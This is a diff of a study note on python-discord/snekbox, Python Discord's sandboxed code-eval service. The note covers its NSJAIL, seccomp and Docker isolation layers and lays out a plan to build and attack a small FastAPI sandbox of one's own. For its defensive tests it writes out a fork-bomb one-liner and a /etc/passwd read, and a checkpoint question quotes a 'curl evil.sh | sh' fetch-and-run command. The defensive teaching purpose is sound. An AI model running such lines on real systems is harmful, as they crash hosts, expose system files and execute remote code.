@@ -1,69 +1,88 @@
 ---
 course_code: "CASESTUDY"
 course_name: "Open-Source Case Studies"
-unit: "Case Study 10 — python-discord/snekbox"
-tags: [security, sandboxing, python, nsjail, case-study]
+unit: "Case Study 10 — python-discord/snekbox [Deep R&D + Build Edition]"
+tags: [security, sandboxing, python, docker, nsjail, case-study, build-plan]
 last_updated: "2026-08-24"
 confidence: "high"
 source: "https://github.com/python-discord/snekbox (fetched 2026-08-24)"
 ---
 
 ## For future agent
-Case study of snekbox — Python Discord's sandboxed arbitrary-Python-code executor (NSJAIL-based, runs untrusted code in isolated containers), powering their bot's `!eval` command for millions of executions. Small codebase, deep security lessons. Fetched 2026-08-24.
+Deep-dive on snekbox with exact mechanism inventory (NSJAIL flags, Docker wrapper, aiohttp service shape) and WHY each isolation layer exists, plus a fully buildable version — **mini-snek: a FastAPI + Docker sandboxed code-eval service with your own attack suite**. Directly reusable for any AI-agent code-execution feature you build later. Feeds [[systems-design-distributed]] security sections.
 
-# Snekbox — Sandboxing Untrusted Code
+# Snekbox — Deep R&D
 
-## What It Is
+## Part 1 — The Code Inventory
 
-An HTTP service that executes arbitrary user-supplied Python safely: receives code via REST (`POST /eval`), runs it inside an NSJAIL-sealed environment (namespaces, seccomp, resource limits, no network), returns stdout/stderr with timeouts. The infrastructure behind Python Discord's eval bot — battle-tested against adversarial users at scale.
+| Component | Tech | Mechanism |
+|-----------|------|-----------|
+| HTTP service | Python **aiohttp** | `POST /eval {code}` → job → JSON result (stdout/stderr/status); async job handling |
+| **NSJAIL** invocation | C binary by Google | The actual jail: clones process into **mount namespace** (isolated fs view), **PID namespace** (can't see host procs), applies **seccomp filter** (syscall allowlist), sets **rlimits** (CPU/proc/memory), `--disable_proc`, chroot-ish rootfs |
+| Container layer | Dockerfile around NSJAIL | Extra boundary: container itself isolated from host |
+| Timeouts | asyncio + jail time limits | Infinite loops die twice over |
+| Config | Nsjail config proto + env | Tunable limits per deployment |
 
-## How It Works (conceptual)
+The defense stack in order: **Docker → NSJAIL namespaces → seccomp → rlimits → timeout → no-network → non-root → read-only mounts.** Eight walls; each exists because attackers defeated fewer-walled predecessors.
 
-```mermaid
-flowchart LR
-    A["API request:<br/>user code"] --> V["Validation +<br/>timeouts"]
-    V --> J["NSJAIL jail:<br/>mount namespaces,<br/>seccomp filters,<br/>rlimits, no network"]
-    J --> P["Python subprocess<br/>(isolated venv)"]
-    P --> O["Capture stdout/stderr<br/>+ exit status -> response"]
+## Part 2 — Why That Design
+
+| Choice | Why |
+|--------|-----|
+| NSJAIL not hand-rolled subprocess | Hand-rolled isolation always has holes (fork bombs escape rlimits-less runners; /proc leaks host info; network enables exfil). Battle-tested tool encodes years of escapes |
+| seccomp allowlist | Default-deny syscalls kills exotic kernel-attack surfaces wholesale |
+| No network | Kills data exfiltration AND most exploit delivery in one flag |
+| Separate service (not in-bot) | Bot restarts ≠ killing running evals; scaling independent; blast radius contained |
+| stdout/stderr capture only | No structured side-channels back to callers |
+
+## Part 3 — Can I Build My Own Version? ✅ YES — mini-snek (flagship security build)
+
+```
+Spec (FastAPI + Docker on your Windows machine via WSL2/Docker Desktop):
+
+M1: POST /eval {language:"python", code:"print(1+1)"} ->
+    runs code inside container:
+      docker run --rm --network=none --memory=256m --cpus=0.5
+        --pids-limit=64 --read-only -v /tmp/out:/out python:3.12-slim
+        timeout 10 python -c <code>
+    return captured output.
+
+M2: Attack suite as pytest cases against YOUR OWN endpoint:
+    fork bomb (def f(): os.fork();f()) -> expect killed, host alive
+    open('/etc/passwd').read() -> expect FileNotFoundError/empty view
+    socket/network probe -> expect failure (no network)
+    infinite loop -> 10s timeout enforced
+    write attempt to / -> read-only violation
+
+M3: Hardening pass: drop capabilities (--cap-drop=ALL), add user=nonroot,
+    seccomp profile (docker --security-opt seccomp=strict-ish)
+
+M4: Wire into a Discord bot OR an AI-agent tool-calling endpoint
+    (= the exact production use-case for 2026 agents).
 ```
 
-**Load-bearing lessons**:
-1. **Defense in depth**: not one wall but stacked walls — container isolation + syscall filtering + resource caps + timeouts + network removal. Any single layer WILL eventually fail.
-2. **Assume hostile input always**: their threat model treats every request as an attack (fork bombs, infinite loops, escape attempts) — the correct default for public endpoints
-3. **Small surface discipline**: the service does ONE thing; every feature request expands attack surface and gets scrutinized
-4. **Real-world hardening**: issues/issues-closed history is a free course in "what attackers actually try"
+### Failure modes while building
 
-## What To Extract
+| Failure | Counter |
+|---------|---------|
+| Output capture races (process killed mid-write) | Read streams with timeouts; tolerate truncation |
+| Windows Docker quirks (WSL2 memory) | Cap WSL VM RAM; test limits empirically |
+| False confidence after M1 | M2 attack suite is the actual lesson — passing YOUR attacks is the grade |
 
-| Lesson | Application |
-|--------|-------------|
-| Sandbox design pattern | Any feature executing user input (your future bots/apps) |
-| Timeout + rlimit everywhere | Every script-runner you build |
-| Threat-model-first design | Write the attack list BEFORE the feature |
-| FastAPI service shape | Clean small-service reference ([[languages-python-advanced]]) |
+**Premortem**: *"Built it; never attacked it; assumed safe."* The unwargamed sandbox is theater. M2 is non-negotiable.
 
-## Failure Modes
+## Part 4 — Life Integration
 
-| Failure | Mechanism | Counter |
-|---------|-----------|---------|
-| "Sandboxed enough" illusion | Rolling your own isolation with subprocess alone | Never hand-roll; use NSJAIL-class tools |
-| Studying without deploying | Security concepts stay theoretical | Deploy snekbox locally; try to break YOUR instance |
-| Escape-attempt curiosity | Testing escapes against OTHERS' infra | Attack only your own sandbox — legally and ethically |
+- Reuse pattern for: AI-agent code tools, online-judge features, plugin systems
+- Metrics: attack-suite cases passing · layers named from memory · one real hostile input survived
+- Interview story tier: top-tier fresher security narrative ("I built and then attacked my own sandbox")
 
-**Premortem**: *"Read the README, understood nothing about NSJAIL."* NSJAIL requires namespace/seccomp background — pair this case study with a Linux namespaces primer first ([[systems-design-distributed]] foundations).
+## Checkpoint Questions
 
-## Life Integration
-
-- Perfect companion to any eval/AI-agent feature you build (agents running code = snekbox problem)
-- Metrics: local instance deployed · own attack-attempts logged (fork bomb? network probe?) · defense layers named from memory
-- Interview story: "I ran a sandbox and attacked it" beats any certification
-
-## Example Checkpoint Questions
-
-1. List five isolation layers snekbox stacks — what does each block specifically?
-2. Why is "no network" critical for code-execution sandboxes? Name two exfiltration paths it kills.
-3. Your AI agent needs to run generated code — walk your sandbox checklist.
+1. Which single layer stops a fork bomb — and which stops `/etc/passwd` reading? (They're different.)
+2. Why is default-DENY seccomp stronger than default-allow-with-blocklist?
+3. Your agent's LLM generates `os.system("curl evil.sh | sh")` — walk exactly which walls it dies at.
 
 ## Cross-Vault Links
 
-[[modules/case-studies/index|Field Index]] · [[systems-design-distributed]] · [[modules/retrieval-agent/overview]] (agent-tooling sibling) · [[languages-python-advanced]]
+[[modules/case-studies/index|Field Index]] · [[systems-design-distributed]] · [[modules/retrieval-agent/overview]] · [[languages-python-advanced]]
